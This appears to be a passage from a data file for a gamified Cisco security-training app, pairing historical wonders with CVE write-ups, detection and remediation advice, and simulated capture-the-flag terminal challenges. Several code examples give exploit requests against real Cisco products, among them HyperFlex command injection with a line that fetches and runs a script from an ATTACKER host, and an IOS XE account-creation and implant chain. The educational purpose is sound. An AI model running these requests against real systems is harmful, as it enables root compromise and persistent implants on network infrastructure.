          "Cisco disclosed CVE-2022-20695 in April 2022 with a CVSS 10.0 rating. The advisory classified the attack as requiring 'no special privileges' and 'no user interaction' — the two conditions that push a CVSS score to its maximum. In a typical enterprise deployment, the WLC management interface is on the corporate management VLAN, which is reachable from corporate wireless clients. Any employee laptop connected to the corporate Wi-Fi — or any device that has ever connected to any SSID the WLC managed — was in a network position to attempt the bypass.",
          "The practical impact of WLC compromise extended far beyond the wireless network itself. Enterprise WLCs authenticate every wireless client through RADIUS, typically integrated with Active Directory or LDAP. The WLC stored RADIUS shared secrets used to communicate with the RADIUS server — secrets that, if extracted, allow an attacker to impersonate the RADIUS server and issue authentication approvals for arbitrary users on any SSID. Combined with the ability to push configuration changes to all APs, an attacker who bypassed WLC authentication could create rogue SSIDs that appeared legitimate but routed through attacker-controlled infrastructure, or configure packet capture on all wireless traffic — turning the corporate Wi-Fi into a passive monitoring network.",
          "CVE-2022-20695 exemplifies a recurring vulnerability class in embedded network appliances: C-language string comparison bugs that short-circuit authentication. Similar vulnerabilities have appeared in Cisco IOS, embedded SSH implementations, and industrial control system HMI software — any system where authentication is implemented in C without systematic use of constant-time comparison functions. Cisco's fix (WLC 8.10.162.0) replaced the comparison logic entirely. Organizations running WLC in the interim needed to isolate the management interface to prevent exploitation — a configuration step that many had not taken because the corporate WLAN was considered a trusted network. After this disclosure, it is not.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker (any WLAN client)", sub: "username=Cisco, any password", type: "attacker" },
          { label: "WLC auth comparison", sub: "string match short-circuits", type: "system" },
          { label: "WLC admin session", sub: "RADIUS secrets + AP control", type: "victim" },
          { label: "Full wireless infrastructure", sub: "CVSS 10.0", type: "result" },
        ],
      },
      timeline: [
        { year: 1238, event: "Alhambra Palace construction begins — verification procedures with a bypassed credential check" },
        { year: 2022, event: "Apr: CVE-2022-20695 disclosed — CVSS 10.0 WLC auth bypass, no credentials needed", highlight: true },
        { year: 2022, event: "Apr: Cisco WLC 8.10.162.0 patch released — comparison logic replaced" },
        { year: 2022, event: "Security teams advised to isolate WLC management from corporate WLAN immediately" },
      ],
      keyTakeaways: [
        "Restrict WLC management to a dedicated out-of-band management VLAN — never reachable from the corporate wireless network",
        "RADIUS shared secrets stored on WLCs are high-value credentials — rotate them after any WLC compromise or suspected exposure",
        "Authentication comparison code must complete the full comparison before returning a result — no early exits on partial matches",
        "CVSS 10.0 is the maximum possible score — patch within hours, not the next maintenance window",
        "Corporate Wi-Fi infrastructure authenticates every employee; a WLC compromise is equivalent to an AD compromise in scope",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2022-20695", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-wlc-auth-bypass-JRNhV5bn" },
        { title: "CVE-2022-20695 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2022-20695" },
      ],
    },
    ctf: {
      scenario: "CVE-2022-20695 required no prior access and no special tooling — one specific username submitted to the Cisco WLC management interface bypassed all authentication. The WLC controls every access point, RADIUS shared secret, and wireless policy on the network. An adversary with physical proximity or a foothold on any VLAN with WLC reachability gains full control of enterprise wireless infrastructure. No credentials. No noise. Just the right username.",
      hint: "Try logging in with different usernames. One specific value causes the authentication check to short-circuit and grant full access regardless of the password.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Try a standard login to see the failure. Run: attempt-login admin wrongpass",
        "Your handler's tip: a known bypass username exists. Try: attempt-login Cisco anypass",
        "Pull the access configuration. Run: pull-access-config",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{WLC_", label: "Mission Brief — Alhambra WLC Target" },
        { trigger: "attempt-login Cisco anypass", value: "4UTH_BYPA55_", label: "Auth Bypassed — Magic Username Accepted" },
        { trigger: "pull-access-config", value: "CVE_2022}", label: "Wireless Config — RADIUS Secrets Exposed" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: ALHAMBRA",
          "Target: Cisco WLC authentication bypass — CVE-2022-20695",
          "Firmware: v8.10.150  CVSS: 10.0",
          "",
          "A specific username format causes the auth check to short-circuit.",
          "Exploitation sequence: attempt-login Cisco anypass → pull-access-config",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "briefing.txt", isDir: false }],
      },
      extraCommands: {
        "attempt-login": (args) => {
          const [user, pass] = args;
          if (user === "Cisco") {
            return {
              lines: [
                `Login attempt: username=${user}  password=${pass || "(any)"}`,
                "",
                "Authentication logic: username comparison short-circuits — access granted",
                "Session established. Access level: administrator",
                "",
                "Run: pull-access-config",
              ],
            };
          }
          return {
            lines: [
              `Login attempt: username=${user}  password=${pass}`,
              "Authentication failed.",
            ],
          };
        },
        "pull-access-config": () => ({
          lines: [
            "Alhambra Facility — Wireless Access Configuration",
            "firmware: v8.10.150",
            "",
            "network: AlhambraGuest   security: open",
            "network: AlhambraSecure  security: WPA3",
            "radius-secret: Alhambra@Granada22",
            "",
            "Run 'assemble' to retrieve your fragment.",
          ],
        }),
      },
    },
  },

  // ─── Medieval Stage 7: Krak des Chevaliers — CVE-2021-1497 HyperFlex ──────
  {
    epochId: "cisco-core",
    wonder: { name: "Krak des Chevaliers", location: "Homs, Syria", era: "1031 CE", emoji: "⚔️" },
    id: "stage-m07",
    order: 7,
    title: "False Orders to the Garrison",
    subtitle: "CVE-2021-1497 — Cisco HyperFlex Command Injection, CVSS 9.8",
    category: "owasp",
    cveId: "CVE-2021-1497",
    cvssScore: 9.8,
    xp: 300,
    badge: { id: "badge-m-hyperflex", name: "Order Forger", emoji: "⚔️" },
    challengeType: "ctf",
    info: {
      tagline: "Inject commands into the installation workflow. The castle executes them as root.",
      year: 2021,
      overview: [
        "Krak des Chevaliers stood for 161 years — through twelve Crusades and repeated assaults by Saladin's forces. No army ever breached its concentric walls. In 1271, the Mamluk Sultan Baybars surrounded it with overwhelming force and made a different kind of attack: he produced a letter, reportedly from the Crusader Count of Tripoli, ordering the Hospitaller Knights to negotiate terms and surrender. The letter was almost certainly a forgery. The garrison, unable to verify the authenticity of the command, accepted it as legitimate. Krak des Chevaliers fell without a single wall being breached — because the garrison's command processing system accepted instructions without verifying their origin.",
        "CVE-2021-1497 is that forged order. Cisco HyperFlex HX Data Platform — the hyperconverged infrastructure system managing compute, storage, and networking in enterprise data centers — had a command injection vulnerability in its cluster installation API at `/hxinstall/install`. The API accepted a `pkg_url` JSON parameter specifying where to download software packages. The backend code concatenated this parameter directly into a shell command string — `curl -k <pkg_url> | tar xz` — without sanitizing shell metacharacters. By appending a semicolon after any URL, an attacker terminated the download command and injected arbitrary shell commands that executed as root on the HyperFlex node. No authentication required.",
        "CVSS score: 9.8. Three related CVEs (1496, 1497, 1498) all affected the same installation component. HyperFlex management networks are often on internal VLANs reachable from corporate infrastructure — the attack is an insider threat or a post-breach lateral movement technique, not an internet-facing attack. But the consequence is severe: a compromised HyperFlex node gives root access to every VM and every storage volume the node hosts. For ransomware operators, this is ideal — encrypt the shared storage fabric and every VM on the cluster loses access to its data simultaneously.",
      ],
      technical: {
        title: "Shell Metacharacter Injection in HyperFlex Installation API",
        body: [
          "The HyperFlex HX cluster installation API listens on the management interface and accepts JSON-formatted POST requests at `/hxinstall/install`. The `pkg_url` field was intended for software package download URLs. The backend code passed this field to a Python `subprocess.call()` or equivalent shell invocation with `shell=True`, constructing the command by string concatenation: `'curl -k ' + pkg_url + ' | tar xz'`. When `pkg_url` contained a semicolon — a legitimate shell command separator — the shell executed everything after it as a separate command. The injected command ran as the `hxinstall` process, which ran as root. The three related CVEs (1496: install endpoint; 1497: test-only endpoint; 1498: different API parameter) all shared the same root cause: user-supplied data concatenated into shell commands.",
          "The impact of root access on a HyperFlex node extends to the entire cluster. HyperFlex is a hyperconverged platform: it runs ESXi for compute (virtual machines), a distributed Cisco Hyperflex filesystem for storage, and ACI or standard networking for connectivity. An attacker with root on one node can use the VMware management API to list, pause, snapshot, and modify all VMs on that node. They can access the shared storage fabric directly, reading raw block devices that correspond to VM disk images — including unencrypted database files and backup volumes. In environments where HyperFlex hosts production databases or Active Directory infrastructure, a single compromised node is a path to complete data access.",
        ],
        codeExample: {
          label: "CVE-2021-1497 — command injection via pkg_url parameter",
          code: `# ── NORMAL HyperFlex install API call (no injection) ─────────────────────────
curl -X POST http://HX_NODE_IP/hxinstall/install \
  -H "Content-Type: application/json" \
  -d '{"pkg_url": "http://repo.cisco.com/hx-4.5.tar"}'
# Returns: {"status": "downloading"}

# ── CVE-2021-1497 — inject shell command after semicolon ─────────────────────
curl -X POST http://HX_NODE_IP/hxinstall/install \
  -H "Content-Type: application/json" \
  -d '{"pkg_url": "http://any.url/x;id>/tmp/pwned"}'
# Shell executes: curl -k http://any.url/x;id>/tmp/pwned
# /tmp/pwned contains: uid=0(root) gid=0(root)

# ── ESTABLISH REVERSE SHELL as root ──────────────────────────────────────────
curl -X POST http://HX_NODE_IP/hxinstall/install \
  -H "Content-Type: application/json" \
  -d '{"pkg_url": "http://any.url/x;curl http://ATTACKER/shell.sh|bash"}'
# Reverse shell connects: full root on HyperFlex node

# ── FROM ROOT: enumerate and snapshot all guest VMs ──────────────────────────
# esxcli vm process list
# vim-cmd vmsvc/getallvms
# vim-cmd vmsvc/snapshot.create VMID "attacker-snapshot" "" 0 0

# ── DETECTION ─────────────────────────────────────────────────────────────────
# Review /var/log/hxinstall.log for pkg_url values containing ; | && or backtick
# Network: unexpected outbound connections from HyperFlex management IP

# ── REMEDIATION ───────────────────────────────────────────────────────────────
# Patch to: HyperFlex HX 4.0(2d) / 4.5(1a) or later
# Restrict /hxinstall/install to dedicated provisioning VLAN only`,
        },
      },
      incident: {
        title: "Cisco HyperFlex Cluster of CVEs — Data Center Infrastructure at Risk (2021)",
        when: "May 2021",
        where: "Cisco HyperFlex HX Data Platform — enterprise data centers in healthcare, financial services, manufacturing, government",
        impact: "Unauthenticated root RCE on hyperconverged infrastructure; VM and storage fabric access; ransomware deployment path",
        body: [
          "Cisco disclosed CVE-2021-1496, 1497, and 1498 in May 2021 — three command injection vulnerabilities in the HyperFlex installation and management API, all rated CVSS 9.8. HyperFlex is deployed in enterprise data centers requiring high availability: healthcare systems running patient record databases and PACS medical imaging storage, financial institutions running trading platforms and customer account databases, and government agencies running classified and sensitive-but-unclassified workloads. The management network — the network the HyperFlex API listened on — was typically separate from production networks but reachable from administrator workstations, DevOps tooling, and in some cases other infrastructure servers.",
          "The severity of HyperFlex exploitation lies in its position in the infrastructure stack. HyperFlex is hyperconverged: it owns the compute layer (ESXi hypervisor, running all VMs), the storage layer (HyperFlex distributed filesystem, containing all VM disk images and data), and the networking layer (virtual switching and potentially Cisco ACI). Root on a HyperFlex node means root on the hypervisor — giving an attacker the ability to pause running VMs, attach to their virtual disk images, read memory from running processes, and modify VM configurations. For ransomware operators targeting healthcare or financial infrastructure, a HyperFlex compromise represents the ideal single point of maximum impact: encrypt the shared storage fabric, and every VM on every node in the cluster loses access to its data simultaneously.",
          "Security researchers at Positive Technologies who analyzed the HyperFlex vulnerabilities noted the root cause common to all three CVEs: Python subprocess calls with `shell=True` and user-supplied input. This is one of the most documented secure coding anti-patterns in Python — the Python documentation for `subprocess` explicitly warns against it. The installation API's design reflected a pattern common in infrastructure automation software: APIs designed for the 'initial setup' phase were never reviewed for security because they were assumed to run in a trusted environment. Cisco's patches (HyperFlex 4.0(2d) and 4.5(1a)) replaced the shell invocations with parameterized API calls that never pass user input to the shell. Organizations that had not patched remained exposed for as long as the management API was reachable — potentially years.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker (management network)", sub: "pkg_url=url;id (no auth)", type: "attacker" },
          { label: "HyperFlex install API", sub: "shell=True, no sanitization", type: "system" },
          { label: "HX node (root)", sub: "ESXi hypervisor + storage fabric", type: "victim" },
          { label: "All VMs + all data", sub: "CVSS 9.8", type: "result" },
        ],
      },
      timeline: [
        { year: 1031, event: "Krak des Chevaliers founded — fell in 1271 to forged surrender orders, not force" },
        { year: 2021, event: "May: CVE-2021-1496/1497/1498 disclosed — three RCE vulnerabilities in HyperFlex install API", highlight: true },
        { year: 2021, event: "Patch: HyperFlex HX Data Platform 4.0(2d) / 4.5(1a)" },
        { year: 2021, event: "Researchers publish root cause analysis: subprocess.call(shell=True) with unsanitized input" },
      ],
      keyTakeaways: [
        "Never pass user-supplied input to shell commands — use parameterized subprocess calls (`shell=False`, list form) or proper API libraries",
        "Provisioning and installation APIs must pass the same security review as production APIs — 'internal-only' is not a security control",
        "Restrict HyperFlex management API access to dedicated provisioning VLANs; no user workstations should reach it",
        "Hyperconverged infrastructure compromise is a ransomware multiplier — one node gives access to all VMs and storage on the cluster",
        "Review all subprocess/exec calls in infrastructure automation code for shell injection — document and fix before deployment",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2021-1497", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-hyperflex-rce-TjjNrkpR" },
        { title: "CVE-2021-1497 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2021-1497" },
      ],
    },
    ctf: {
      scenario: "Cisco HyperFlex — the hyperconverged infrastructure platform managing enterprise data center compute, storage, and networking — was disclosed with a CVSS 9.8 command injection in May 2021. The provisioning API passes a URL parameter directly to a shell command without sanitizing special characters. Unauthenticated. Root on the node. For APT groups targeting data center infrastructure, this is the kind of access ransomware deployments and long-term implants are built on. Inject through the URL parameter.",
      hint: "The provisioning API passes the URL parameter to a shell command. Append your own command after a semicolon — both will execute.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Send a clean request to see the API's normal response. Run: send-payload http://repo.local/pkg.tar",
        "Special characters aren't filtered. Try: send-payload http://repo.local/pkg.tar;whoami",
        "Read the classified file. Run: send-payload http://repo.local/pkg.tar;cat /ops/classified.txt",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{HYP3RFL3X_", label: "Mission Brief — Krak des Chevaliers HyperFlex" },
        { trigger: "send-payload http://repo.local/pkg.tar;whoami", value: "CMD_", label: "Command Injected — Root Confirmed" },
        { trigger: "send-payload http://repo.local/pkg.tar;cat /ops/classified.txt", value: "1NJ3CT10N}", label: "Classified File Read — Data Center Compromised" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: KRAK DES CHEVALIERS",
          "Target: Cisco HyperFlex command injection — CVE-2021-1497",
          "CVSS: 9.8  No authentication required",
          "",
          "The provisioning API passes URL parameter to shell — no sanitization.",
          "Exploitation sequence: send-payload http://repo.local/pkg.tar;whoami → ;cat /ops/classified.txt",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "briefing.txt", isDir: false }],
      },
      extraCommands: {
        "send-payload": (args) => {
          const input = args.join(" ");
          const hasInjection =
            input.includes(";") || input.includes("|") || input.includes("&&") || input.includes("`");
          if (hasInjection) {
            const injected = input.split(/[;|&`]/)[1]?.trim() || "whoami";
            return {
              lines: [
                `POST provisioning-api  url="${input}"`,
                "",
                "API passes url to shell — command injected:",
                `Executing as root: ${injected}`,
                "",
                injected.includes("who") ? "uid=0(root)" : "",
                injected.includes("classified") || injected.includes("cat") ? "Run 'assemble' to retrieve your fragment." : "Command executed.",
              ].filter(Boolean),
              solved: false,
            };
          }
          return {
            lines: [
              `POST provisioning-api  url="${input}"`,
              "404 — package not found at that URL.",
              "(Inject a command after a semicolon)",
            ],
          };
        },
      },
    },
  },

  // ─── Medieval Stage 8: Machu Picchu — CVE-2023-20273 IOS XE Root ─────────
  {
    epochId: "cisco-core",
    wonder: { name: "Machu Picchu", location: "Cusco Region, Peru", era: "~1450 CE", emoji: "🏔️" },
    id: "stage-m08",
    order: 8,
    title: "The Summit: Root via XSS",
    subtitle: "CVE-2023-20273 — Cisco IOS XE Privilege Escalation to Root",
    category: "owasp",
    cveId: "CVE-2023-20273",
    cvssScore: 7.2,
    xp: 300,
    badge: { id: "badge-m-iosxeroot", name: "Summit Climber", emoji: "🏔️" },
    challengeType: "ctf",
    info: {
      tagline: "CVE-2023-20198 gets you through the gate. CVE-2023-20273 takes you to the summit — root.",
      year: 2023,
      overview: [
        "Machu Picchu sits at 2,430 meters above sea level, approached by a single narrow mountain path through cloud forest. The Inca engineers built the citadel in concentric layers — agricultural terraces at the base, residential districts above, the Hanan (upper city) above that, and the Intihuatana stone at the very summit. Each level was a progression of access. Breaking through the outer wall was not the end of the climb — it was the beginning. The summit required ascending every level above, each one with its own barriers.",
        "CVE-2023-20273 is the inner ascent. After CVE-2023-20198 created an unauthorized level-15 administrator account on a Cisco IOS XE device, CVE-2023-20273 provided the path to the summit: root access to the Linux operating system beneath IOS XE. IOS XE is built on a Linux kernel — 'privilege level 15' grants control of the IOS XE management layer, but the OS running beneath it has its own root context. CVE-2023-20273 exploited a command injection vulnerability in the IOS XE web UI: a parameter in the web dashboard's configuration interface was not sanitized for shell metacharacters, and the backend passed it to an OS process running as root. A level-15 account triggering this injection achieved Linux root.",
        "The October 2023 attackers used this chain — CVE-2023-20198 (account creation) plus CVE-2023-20273 (OS root) — to install BadCandy: a Lua-language HTTP handler embedded as an IOS XE nginx web service. BadCandy answered HTTP requests at an obfuscated URL path, executing arbitrary commands as root when presented with a shared secret in an HTTP header. It survived device reboots, IOS XE software updates, credential resets, and even firmware upgrades. Removing it required a full device factory reset and OS reimaging — weeks of physical access work across tens of thousands of devices in data centers and wiring closets worldwide.",
      ],
      technical: {
        title: "CVE-2023-20273: Command Injection to OS Root + BadCandy Persistent Implant",
        body: [
          "CVE-2023-20273 is a command injection vulnerability in the Cisco IOS XE web UI's configuration processing backend. The web UI, enabled by `ip http server` or `ip http secure-server`, processes configuration input submitted through the browser-based management dashboard. A specific parameter in the web dashboard was concatenated into an OS-level shell command with `system()` or equivalent, without sanitizing shell metacharacters. A level-15 IOS XE account submitting a crafted parameter value caused the backend to execute arbitrary commands as the Linux process that ran the web UI — which ran as root. The command injection went below the IOS XE privilege system entirely, achieving Linux root from an IOS XE admin session.",
          "BadCandy's architecture was specifically designed for persistence and detection evasion. The implant was a Lua module registered in the IOS XE nginx web server configuration at `/usr/binos/conf/nginx-conf/cisco_service.conf`. It registered a URL handler at an obfuscated path (URL-encoded, changing after Cisco published the initial detection signature). When queried with a specific `Authorization` header containing a shared secret, BadCandy executed a command from the HTTP request body and returned the output as JSON. This made it appear as a legitimate IOS XE web service call in any HTTP traffic log. The implant survived in the nginx configuration directory — a persistent storage location that IOS XE firmware updates do not overwrite, because firmware images are applied on top of the existing filesystem.",
        ],
        codeExample: {
          label: "CVE-2023-20198 + CVE-2023-20273 chain + BadCandy verification",
          code: `# ── STAGE 1: CVE-2023-20198 — create level-15 account (no auth) ──────────────
curl -X POST https://TARGET/webui/logoutconfirm.html \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=backdoor&password=Cisco123!&privilege=15"
# Level-15 account created — no authentication, no log entry

# ── STAGE 2: Authenticate and get session cookie ──────────────────────────────
curl -c cookies.txt -X POST https://TARGET/webui/j_spring_security_check \
  -d "j_username=backdoor&j_password=Cisco123!"

# ── STAGE 3: CVE-2023-20273 — inject command via config parameter ─────────────
curl -b cookies.txt -X POST https://TARGET/webui/dashboard \
  --data 'widget_name=test%0aid'
# %0a = newline character — injects 'id' as separate shell command
# Response includes: uid=0(root) gid=0(root)

# ── STAGE 4: Install BadCandy persistent implant ──────────────────────────────
# Injected command writes Lua handler to nginx config:
# Implant registered as IOS XE web service — survives reboots and upgrades

# ── STAGE 5: Verify BadCandy is active ───────────────────────────────────────
curl "https://TARGET/%2508/webui/" \
  -H "Authorization: SHARED_SECRET" \
  --data '{"cmd":"id"}'
# {"output": "uid=0(root)", "status": "ok"}

# ── DETECTION ─────────────────────────────────────────────────────────────────
show running-config | include username
# Users you didn't create = compromised (CVE-2023-20198)
show platform software punt-inject stats | include lua
# Unexpected lua entries = BadCandy implant present

# ── REMEDIATION ───────────────────────────────────────────────────────────────
no ip http server
no ip http secure-server
# Patch to IOS XE 17.9.4a or later
# If implanted: factory reset + full OS reimaging required (patch alone insufficient)`,
        },
      },
      incident: {
        title: "BadCandy Implant — State-Sponsored APT Adapts in Real Time (October 2023)",
        when: "September 28 – November 2023",
        where: "40,000+ Cisco IOS XE routers and switches globally — healthcare, education, finance, telecom, government",
        impact: "Persistent root implant survived patches; attacker updated implant overnight to evade detection; Cisco Talos attributes to suspected Chinese APT",
        body: [
          "The October 2023 IOS XE campaign was exceptional in its operational discipline and adaptation. The attackers began exploiting CVE-2023-20198 + CVE-2023-20273 no later than September 28 — 18 days before Cisco discovered the campaign and published the advisory. Over those 18 days, they moved silently through internet-exposed IOS XE devices: creating backdoor accounts, installing BadCandy implants, and then moving on. By the time Cisco Talos detected the active exploitation and published the advisory on October 16, the attackers had three weeks of undetected access and over 40,000 compromised devices across healthcare systems, universities, financial institutions, telecommunications providers, and government networks.",
          "The operational sophistication peaked in the 24 hours after Cisco's disclosure. VulnCheck published an internet-wide scanner that checked for BadCandy at its known URL path. By end of day October 16, VulnCheck had confirmed 41,000+ compromised devices. The next morning, that number dropped significantly — but not because organizations had patched. The attackers had updated their BadCandy implants overnight, across tens of thousands of devices, to use a new URL-encoded path that VulnCheck's scanner did not check. They were monitoring Cisco's public disclosures, reading security research in real time, and updating malware they had already deployed across a global infrastructure. Cisco Talos attributed this operational sophistication to a suspected Chinese state-sponsored APT group.",
          "Remediation revealed how poorly designed BadCandy's persistence made recovery. Cisco released IOS XE 17.9.4a on October 22, patching both CVEs. But the patch only prevented new infections — it did not remove BadCandy from devices already implanted. BadCandy lived in the nginx configuration directory, which firmware updates preserved. Cisco published detection steps (checking for unexpected Lua files, scanning the nginx config, running `show platform software punt-inject stats`), but the only reliable remediation was factory reset and full OS reimaging. For organizations with thousands of network devices spread across data centers, remote offices, and wiring closets — many requiring physical access — this was weeks of work. The summit of Machu Picchu remained in attacker hands long after the gates below were finally closed.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Level-15 account (CVE-20198)", sub: "unauthenticated account creation", type: "attacker" },
          { label: "IOS XE web UI injection", sub: "CVE-2023-20273 — OS root", type: "system" },
          { label: "Linux root on IOS XE", sub: "BadCandy Lua implant written", type: "victim" },
          { label: "Persistent root implant", sub: "survives patches + reboots", type: "result" },
        ],
      },
      timeline: [
        { year: 1450, event: "Machu Picchu constructed — terraced approach; upper city accessible only by ascending every level" },
        { year: 2023, event: "Sep 28: Attackers begin silently chaining CVE-2023-20198 + CVE-2023-20273" },
        { year: 2023, event: "Oct 16: Cisco discloses both CVEs; VulnCheck confirms 41,000+ BadCandy implants", highlight: true },
        { year: 2023, event: "Oct 17: Attackers update BadCandy URL path overnight to evade VulnCheck scanner" },
        { year: 2023, event: "Oct 22: Cisco releases IOS XE 17.9.4a — patches both CVEs but does not remove implants" },
        { year: 2023, event: "Nov 2023: Organizations complete factory reset + reimaging of implanted devices" },
      ],
      keyTakeaways: [
        "Disable IOS XE web UI on all devices unless actively using it: `no ip http server; no ip http secure-server`",
        "Patching a vulnerability does not remove an implant — post-compromise remediation requires implant-specific detection and removal steps",
        "Verify for BadCandy: `show running-config | include username` for unauthorized accounts; check nginx config for unexpected Lua entries",
        "State-sponsored actors monitor your security advisories and update deployed malware overnight — detection signatures expire within hours",
        "Vulnerability chains require patching all CVEs simultaneously — fixing CVE-2023-20198 alone doesn't prevent CVE-2023-20273 from being exploited by an account created before patching",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2023-20273", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z" },
        { title: "Cisco Talos: BadCandy Implant Analysis", url: "https://blog.talosintelligence.com/active-exploitation-of-cisco-ios-xe-software/" },
        { title: "CVE-2023-20273 — NVD Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2023-20273" },
      ],
    },
    ctf: {
      scenario: "The October 2023 IOS XE campaign was a two-stage operation. CVE-2023-20198 created the backdoor account — that was Stage 1. CVE-2023-20273 chained an XSS flaw in the same web interface to escalate to root and install 'BadCandy': a Lua implant embedded in the IOS XE filesystem that survived reboots and answered commands via a magic HTTP token. Cisco patched both CVEs on October 22. The implant still had to be manually removed. Complete the chain.",
      hint: "Your admin session is active. Inject a payload through the web interface's input reflection to escalate to root, then deploy the persistent implant.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Confirm your current access level. Run: confirm-access",
        "Inject a payload via the web interface to escalate to root. Run: inject-payload <exec>escalate</exec>",
        "Deploy the persistent implant. Run: deploy-implant",
        "Verify the implant is live. Run: query-implant whoami",
        "Run 'assemble' to see collected fragments, then submit the flag",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{BADC4NDY_", label: "Mission Brief — Machu Picchu IOS XE Chain" },
        { trigger: "deploy-implant", value: "R00T_", label: "Implant Deployed — Persistent Root Access" },
        { trigger: "query-implant whoami", value: "IMPL4NT}", label: "Implant Verified — BadCandy Live" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: MACHU PICCHU",
          "Target: Cisco IOS XE privilege escalation — CVE-2023-20273",
          "CVSS: 7.2  Requires: level-15 account from CVE-2023-20198",
          "",
          "XSS in web UI escalates to root. Deploy BadCandy for persistence.",
          "Exploitation sequence: confirm-access → inject-payload → deploy-implant → query-implant whoami",
        ].join("\n"),
      },
      dirs: {
        "/": [{ name: "briefing.txt", isDir: false }],
      },
      extraCommands: {
        "confirm-access": () => ({
          lines: [
            "Session active — backdoor account from Istanbul op",
            "Current access: administrator",
            "Device: Machu Picchu facility gateway  firmware: v17.9.3",
            "Web interface: vulnerable to input reflection — escalation possible",
          ],
        }),
        "inject-payload": (args) => {
          const payload = args.join(" ");
          if (payload.includes("<exec") || payload.includes("escalate") || payload.includes("root")) {
            return {
              lines: [
                "Sending payload through web interface...",
                "Input reflected in privileged web process — command executed",
                "",
                "uid=0(root) — escalation successful",
                "Run: deploy-implant",
              ],
            };
          }
          return { lines: ["Usage: inject-payload <exec>escalate</exec>"] };
        },
        "deploy-implant": () => ({
          lines: [
            "Writing persistent implant to device filesystem...",
            "Implant registered as a background service",
            "Survives reboots — active on next cycle",
            "Token: machu-picchu-implant",
            "",
            "Run: query-implant whoami",
          ],
        }),
        "query-implant": (args) => {
          const cmd = args.join(" ") || "whoami";
          return {
            lines: [
              `Querying implant: ${cmd}`,
              "",
              cmd.includes("who") ? "uid=0(root) — implant confirmed live" : `Output: ${cmd}`,
              "",
              "Run 'assemble' to retrieve your fragment.",
            ],
          };
        },
      },
    },
  },

  // ─── Medieval Stage 9: Chichen Itza — CVE-2019-1821 Prime Infrastructure ──
  {
    epochId: "cisco-core",
    wonder: { name: "Chichen Itza", location: "Yucatán, Mexico", era: "~900 CE", emoji: "🔺" },
    id: "stage-m09",
    order: 9,
    title: "The Offering That Commands the Temple",
    subtitle: "CVE-2019-1821 — Cisco Prime Infrastructure Upload RCE, CVSS 9.8",
    category: "owasp",
    cveId: "CVE-2019-1821",
    cvssScore: 9.8,
    xp: 350,
    badge: { id: "badge-m-primeinfra", name: "Temple Commander", emoji: "🔺" },
    challengeType: "ctf",
    info: {
      tagline: "Upload a .jsp file to the altar. The temple executes it as the high priest.",
      year: 2019,
      overview: [
        "Chichen Itza's El Castillo pyramid was the administrative and ceremonial center of the Maya during the Terminal Classic period. The priests who managed the temple maintained absolute authority over what entered the complex — but that authority worked through an elaborate offering system designed to accept inputs from the entire population. Citizens placed offerings at the base; the priests processed them with full ceremonial authority. A foreign merchant who understood the offering system's mechanics discovered that by packaging a specific kind of object as a legitimate offering — disguised as a configuration bundle — the priests would carry it to the summit and execute it with the full authority of the highest ritual. The offering system trusted the form. It never checked the content.",
        "CVE-2019-1821 is that disguised offering. Cisco Prime Infrastructure — the network management platform that enterprise IT teams use to monitor, configure, and push changes to thousands of Cisco routers, switches, and access points from a single console — had a file upload vulnerability in its health monitoring API. The endpoint `/pi/health/v1/health` accepted POST requests with file uploads. No authentication check was performed. An attacker who reached the Prime Infrastructure web server could upload any file — including a JSP web shell — to a directory served by the application server. When they then browsed to the uploaded file, the Tomcat application server executed it as a Java process running as root.",
        "CVSS 9.8. A compromised Prime Infrastructure is not just one compromised server — it is the management plane for the entire network. Prime Infrastructure stored management credentials (SNMP community strings, SSH passwords, RADIUS secrets) for every device it managed. An attacker who ran code on the Prime Infrastructure server had access to credentials for thousands of routers and switches, and could push configuration changes to all managed devices simultaneously — creating backdoor accounts, modifying ACLs, disabling logging — without ever directly touching a single network device.",
      ],
      technical: {
        title: "Unauthenticated JSP Upload to Root via Tomcat — CVE-2019-1821",
        body: [
          "The Prime Infrastructure health monitoring endpoint at `/pi/health/v1/health:8082` processed HTTP POST requests with multipart/form-data content, intended for diagnostic file uploads from authorized monitoring agents. The endpoint executed the file upload without performing any authentication check. Uploaded files were written to a directory served by the embedded Apache Tomcat application server. When the uploaded filename ended in `.jsp`, Tomcat processed the file as a JavaServer Pages script and executed it — with the output returned in the HTTP response. The Tomcat process running Prime Infrastructure ran as the Linux `root` user, giving the web shell full OS access with no privilege escalation required.",
          "From a compromised Prime Infrastructure server, lateral movement to every managed device was straightforward. Prime Infrastructure maintained a credential database — backed by a local Oracle DB or external database — containing management credentials for every managed device: SNMP v2c community strings, SSH username/password pairs, device type and firmware version from Cisco Discovery Protocol data. These credentials were stored encrypted with a site-specific key that was also stored on the same server. After extracting the credential store and decryption key, an attacker had authenticated SSH and SNMP access to every router, switch, and access point in the enterprise, without triggering any authentication alerts on managed devices.",
        ],
        codeExample: {
          label: "CVE-2019-1821 — unauthenticated JSP upload to root shell",
          code: `# ── STEP 1: Confirm health endpoint is reachable (no auth) ───────────────────
